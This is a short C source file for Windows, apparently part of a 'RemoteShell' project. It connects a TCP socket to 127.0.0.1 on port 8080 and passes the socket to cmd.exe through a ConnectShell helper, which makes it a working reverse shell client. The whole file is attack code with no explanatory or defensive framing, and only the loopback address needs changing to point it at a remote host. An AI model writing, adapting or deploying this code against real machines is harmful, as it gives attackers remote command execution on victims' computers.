#include "RemoteShell.h"

int main()
{
    WSADATA wsadata;
    WSAStartup(MAKEWORD(2, 2), &wsadata);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN sockaddr;

    ZeroMemory(&sockaddr, sizeof(SOCKADDR_IN));
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    sockaddr.sin_port = htons(8080);

    connect(s, (const struct sockaddr *)&sockaddr, sizeof(SOCKADDR_IN));
    ConnectShell("C:\\Windows\\System32\\cmd.exe", s, NULL);
}